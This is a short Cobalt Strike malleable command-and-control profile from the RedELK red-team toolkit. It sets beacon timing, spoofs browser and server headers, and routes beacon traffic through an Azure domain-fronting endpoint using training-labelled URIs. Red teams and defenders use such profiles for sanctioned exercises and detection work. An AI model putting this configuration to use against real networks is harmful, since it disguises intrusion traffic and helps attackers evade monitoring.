# Part of RedELK
#
# This is a basic example mallable configuration file for CobaltStrike that works with RedELK
#
# Author: Outflank B.V. / Marc Smeets
#
# Important 1 - change the value of $NameOfYourDomainFrontingEndpoint in the config below to the name of your DomainFronting endpoint name, e.g. somefancyname.azureedgee.net
# Important 2 - configure the listeners in CobaltStrike accordingly: set the HTTP Host Header to the name of your DomainFronting endpoint name, and set the HTTP Hosts to a frontable domain.
#

set sleeptime "5000";
set jitter    "10";
set useragent "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko";

http-config {
	set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
	header "Server" "Apache";
	header "Keep-Alive" "timeout=5, max=100";
	header "Connection" "Keep-Alive";
	set trust_x_forwarded_for "true";
}

http-get {
	set uri "/TRAINING-BEACON";

	client {
		header "Accept" "*/*";
		header "Pragma" "no-cache";
		header "Connection" "Keep-Alive";
        header "Host" "redelkdemo.azureedge.net";
		metadata {
        	base64;
        	header "Cookie";
		}
	}

	server {
		header "Content-Type" "application/octet-stream";

		output {
			print;
		}
	}
}

http-post {
	set uri "/TRAINING-BEACON/submit.php";
	client {
		header "Content-Type" "application/octet-stream";
        header "Host" "redelkdemo.azureedge.net";

      id {
        #netbios;
	    parameter "id";
      }

	  output {
		print;
      }
	}

	server {
		header "Content-Type" "text/html";

		output {
			print;
		}
	}
}
